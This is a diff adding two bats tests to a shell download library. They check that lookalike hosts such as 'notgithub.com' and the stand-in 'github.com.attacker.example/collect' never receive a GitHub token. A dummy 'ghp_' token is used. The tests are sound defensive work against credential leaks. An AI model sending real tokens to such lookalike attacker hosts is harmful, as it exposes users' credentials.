@@ -277,6 +277,51 @@ stub_acfs_curl_response() {
     assert_equal "$(cat "$recorded_dir")" "/"
 }
 
+@test "acfs_download_to_file: a hostname containing github.com stays on the anonymous path" {
+    local dispatch_marker="$BATS_TEST_TMPDIR/github-dispatch"
+    local output_file="$BATS_TEST_TMPDIR/not-github-output"
+
+    github_fetch_with_backoff() {
+        printf '%s\n' "github" > "$dispatch_marker"
+        return 90
+    }
+    acfs_curl() {
+        printf '%s\n' "standard" > "$dispatch_marker"
+        return 0
+    }
+
+    run acfs_download_to_file "https://notgithub.com/collect" "$output_file" "lookalike"
+
+    assert_success
+    assert_equal "$(cat "$dispatch_marker")" "standard"
+}
+
+@test "github_fetch_with_backoff: never attaches a token to a non-GitHub origin" {
+    local fake_curl="$BATS_TEST_TMPDIR/fake-github-curl"
+    local curl_args="$BATS_TEST_TMPDIR/github-curl-args"
+    source "$PROJECT_ROOT/scripts/lib/github_api.sh"
+    cat > "$fake_curl" <<'EOF'
+#!/usr/bin/env bash
+printf '%s\n' "$@" > "$ACFS_FAKE_CURL_ARGS"
+printf '%s' '404'
+EOF
+    chmod +x "$fake_curl"
+    _github_api_curl_binary_path() {
+        printf '%s\n' "$fake_curl"
+    }
+    _github_effective_token() {
+        printf '%s' "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    }
+    export ACFS_FAKE_CURL_ARGS="$curl_args"
+    export GITHUB_MAX_RETRIES=1
+
+    run github_fetch_with_backoff "https://github.com.attacker.example/collect" "" "lookalike"
+
+    [ "$status" -eq 2 ]
+    run grep -F "Authorization:" "$curl_args"
+    assert_failure
+}
+
 @test "calculate_file_sha256: ignores shell function sha256sum" {
     local security_lib="$PROJECT_ROOT/scripts/lib/security.sh"
     local probe_file="${BATS_TEST_TMPDIR:-/tmp}/acfs-sha-poison-probe"
